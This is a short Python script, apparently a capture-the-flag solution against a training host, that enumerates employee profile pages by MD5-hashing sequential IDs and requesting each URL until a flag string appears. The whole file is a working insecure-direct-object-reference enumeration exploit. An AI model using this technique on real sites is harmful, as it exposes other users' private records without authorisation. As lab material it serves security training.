import requests
import hashlib

BASE_URL = "http://chatelaine.cylabacademy.net:46099"

for emp_id in range(1, 25):
    h = hashlib.md5(str(emp_id).encode()).hexdigest()
    url = f"{BASE_URL}/profile/user/{h}"
    r = requests.get(url)
    print(f"ID {emp_id} -> Status: {r.status_code}, Length: {len(r.text)}, Content: {r.text[:80]}", flush=True)
    if "academy{" in r.text or "picoctf{" in r.text or "flag" in r.text.lower():
        print(f"\n[!] FLAG EN ID {emp_id}:")
        print(r.text)
        break
